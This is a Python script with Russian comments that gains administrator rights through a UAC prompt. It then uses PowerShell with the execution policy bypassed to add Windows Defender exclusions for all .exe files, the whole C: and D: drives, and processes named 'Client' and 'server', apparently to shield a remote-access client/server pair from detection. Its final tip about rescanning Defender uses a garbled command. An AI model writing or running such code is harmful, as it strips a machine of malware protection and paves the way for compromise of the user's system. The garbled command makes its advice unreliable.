# exclude_defender_fixed.py
import subprocess
import sys
import ctypes

def run_ps(cmd):
    try:
        result = subprocess.run(
            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', cmd],
            check=True,
            capture_output=True,
            text=True
        )
        print(f"[+] OK: {cmd[:50]}...")
        return True
    except subprocess.CalledProcessError as e:
        # Игнорим warnings и дубликаты — главное, что не фатал
        if e.returncode == 1:
            print(f"[!] Warning ignored (exit 1): {cmd[:50]}... (возможно, уже исключено)")
            return True
        else:
            print(f"[-] Real error: {e}")
            return False

# Проверка и запрос админки
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

print("Запуск с правами админа. Добавляем исключения...")

# Исключаем ВСЕ .exe файлы
run_ps('Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue')

# Исключаем диски (используем правильный формат пути)
run_ps('Add-MpPreference -ExclusionPath "C:\\" -ErrorAction SilentlyContinue')
run_ps('Add-MpPreference -ExclusionPath "D:\\" -ErrorAction SilentlyContinue')

# Исключаем процессы
run_ps('Add-MpPreference -ExclusionProcess "Client.exe" -ErrorAction SilentlyContinue')
run_ps('Add-MpPreference -ExclusionProcess "Client" -ErrorAction SilentlyContinue')
run_ps('Add-MpPreference -ExclusionProcess "server.exe" -ErrorAction SilentlyContinue')
run_ps('Add-MpPreference -ExclusionProcess "server" -ErrorAction SilentlyContinue')

print("Всё готово! Defender теперь игнорирует .exe, C:, D: и процессы. Если warning — нормально, просто уже было.")
print("Перезагрузи Defender для верности: в PowerShell от админа выполни 'Start-MpWDOScan -ScanType QuickScan'")
